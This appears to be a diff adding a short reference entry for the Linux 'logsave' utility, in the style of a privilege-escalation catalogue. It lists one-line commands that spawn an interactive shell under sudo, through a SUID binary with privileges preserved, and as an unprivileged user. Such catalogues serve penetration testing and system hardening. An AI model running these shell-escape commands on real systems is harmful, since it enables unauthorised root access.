@@ -1,0 +1,14 @@
+logsave
+=======
+
+Shell
+-----
+
+[Sudo]
+    logsave /dev/null /bin/sh -i
+
+[SUID]
+    logsave /dev/null /bin/sh -i -p
+
+[Unprivileged]
+    logsave /dev/null /bin/sh -i
